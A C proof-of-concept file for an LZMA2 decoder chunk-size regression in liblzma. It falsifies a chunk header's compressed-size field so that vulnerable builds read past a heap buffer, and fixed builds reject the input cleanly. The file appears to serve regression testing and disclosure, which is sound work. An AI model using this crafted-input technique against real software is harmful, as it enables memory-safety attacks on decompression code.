// SPDX-License-Identifier: 0BSD
//
// PoC for the LZMA2 decoder chunk-size regression.
//
// The stream below is produced with liblzma's own raw LZMA2 encoder and
// then a single chunk header field is rewritten: the "compressed size"
// is claimed to be 4 bytes while the chunk's payload bytes that follow
// the header are left genuine. The crafted stream is handed to
// lzma_raw_decoder() in one exactly-sized heap buffer, the way an
// ordinary caller feeds a complete stream to the public API.
//
// On a build where the LZMA2 decoder hands the inner LZMA decoder a
// byte count instead of an absolute input limit, the range decoder
// loses track of the end of the input and reads past the end of the
// caller's buffer (heap-buffer-overflow READ, caught by AddressSanitizer).
// On a correctly fixed build the same input is rejected cleanly with
// LZMA_DATA_ERROR.
//
// Build (from the repository root, against an ASAN build of liblzma):
//
//   cc -fsanitize=address -g -O1 -I src/liblzma/api \
//      pocs/residual.c build/liblzma.a -lpthread \
//      -o pocs/residual && ./pocs/residual

#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "lzma.h"

#define DATA_SIZE 2048
#define OUT_BUF_SIZE (64 * 1024)

// Claimed compressed size of the first LZMA2 chunk (field value + 1).
#define CLAIMED_COMPRESSED_SIZE 4

static uint8_t data[DATA_SIZE];

static uint8_t compressed[DATA_SIZE + 1024];
static size_t compressed_size = 0;

static uint8_t decoded[OUT_BUF_SIZE];


static void
make_data(void)
{
	// Deterministic, moderately compressible data.
	for (size_t i = 0; i < DATA_SIZE; ++i)
		data[i] = (uint8_t)((i * 13U + (i >> 4) * 7U) & 0xFF);
}


static bool
encode_lzma2(void)
{
	lzma_options_lzma options;
	if (lzma_lzma_preset(&options, 1))
		return false;

	const lzma_filter filters[2] = {
		{ .id = LZMA_FILTER_LZMA2, .options = &options },
		{ .id = LZMA_VLI_UNKNOWN, .options = NULL },
	};

	lzma_stream strm = LZMA_STREAM_INIT;
	if (lzma_raw_encoder(&strm, filters) != LZMA_OK)
		return false;

	strm.next_in = data;
	strm.avail_in = DATA_SIZE;
	strm.next_out = compressed;
	strm.avail_out = sizeof(compressed);

	const lzma_ret ret = lzma_code(&strm, LZMA_FINISH);
	lzma_end(&strm);

	if (ret != LZMA_STREAM_END)
		return false;

	compressed_size = sizeof(compressed) - strm.avail_out;
	return true;
}


int
main(void)
{
	make_data();

	if (!encode_lzma2()) {
		fprintf(stderr, "encoding the sample data failed\n");
		return 1;
	}

	// Parse the first LZMA2 chunk header of the genuine stream:
	//   [0]      control byte (must be an LZMA chunk with new props)
	//   [1..2]   uncompressed size - 1
	//   [3..4]   compressed size - 1
	//   [5]      LZMA properties
	if (compressed_size < 6 || (compressed[0] & 0x80) == 0
			|| compressed[0] < 0xC0) {
		fprintf(stderr, "unexpected encoder output\n");
		return 1;
	}

	const size_t real_compressed
			= ((size_t)compressed[3] << 8 | compressed[4]) + 1;

	// Keep a genuine prefix of the chunk payload. The chunk stays
	// unfinished with this prefix, which is exactly the situation a
	// truncated (or lying) chunk header creates.
	const size_t prefix_size = real_compressed / 2 < 64
			? real_compressed / 2 : 64;
	if (prefix_size < 10) {
		fprintf(stderr, "chunk payload too small for the demo\n");
		return 1;
	}

	// Craft the input stream: genuine header and payload bytes, but the
	// compressed-size field claims the chunk is tiny.
	const size_t input_size = 6 + prefix_size;
	uint8_t *const input = malloc(input_size);
	if (input == NULL) {
		fprintf(stderr, "out of memory\n");
		return 1;
	}

	memcpy(input, compressed, input_size);
	input[3] = (uint8_t)((CLAIMED_COMPRESSED_SIZE - 1) >> 8);
	input[4] = (uint8_t)(CLAIMED_COMPRESSED_SIZE - 1);

	printf("LZMA2 chunk: real compressed size %zu,"
			" claimed compressed size %u,\n"
			"input buffer: %zu bytes (exact heap allocation)\n",
			real_compressed, CLAIMED_COMPRESSED_SIZE, input_size);

	// Decode the crafted stream through the public API, giving the
	// whole input in a single lzma_code() call.
	lzma_options_lzma options;
	if (lzma_lzma_preset(&options, 1)) {
		fprintf(stderr, "preset initialization failed\n");
		return 1;
	}

	const lzma_filter filters[2] = {
		{ .id = LZMA_FILTER_LZMA2, .options = &options },
		{ .id = LZMA_VLI_UNKNOWN, .options = NULL },
	};

	lzma_stream strm = LZMA_STREAM_INIT;
	if (lzma_raw_decoder(&strm, filters) != LZMA_OK) {
		fprintf(stderr, "raw decoder initialization failed\n");
		return 1;
	}

	strm.next_in = input;
	strm.avail_in = input_size;
	strm.next_out = decoded;
	strm.avail_out = OUT_BUF_SIZE;

	lzma_ret ret = LZMA_OK;
	while (ret == LZMA_OK) {
		strm.next_out = decoded;
		strm.avail_out = OUT_BUF_SIZE;
		ret = lzma_code(&strm, LZMA_FINISH);
	}

	lzma_end(&strm);
	free(input);

	printf("decoder handled the input and returned: %d\n", (int)ret);
	return 0;
}
